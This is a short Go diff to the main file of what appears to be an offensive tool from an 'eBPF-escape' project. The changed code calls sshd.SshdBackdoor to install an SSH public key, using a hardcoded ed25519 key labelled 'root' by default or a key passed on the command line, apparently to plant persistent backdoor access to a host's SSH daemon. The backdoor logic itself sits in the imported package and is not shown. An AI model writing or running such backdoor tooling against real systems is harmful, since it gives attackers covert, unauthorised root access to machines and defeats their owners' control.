@@ -3,13 +3,15 @@
 package main
 
 import (
-	"fmt"
+	"os"
 
 	"github.com/yoeelingBin/eBPF-escape/pkg/sshd"
 )
 
 func main() {
-	if err := sshd.BackdoorSshd(); err != nil {
-		fmt.Println(err)
+	if len(os.Args) < 2 {
+		sshd.SshdBackdoor("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOZOTdoCvyxP9XOxKvlspxRszDhgOH7xcAQGYPqKGiVM root")
+	} else {
+		sshd.SshdBackdoor(os.Args[1])
 	}
 }
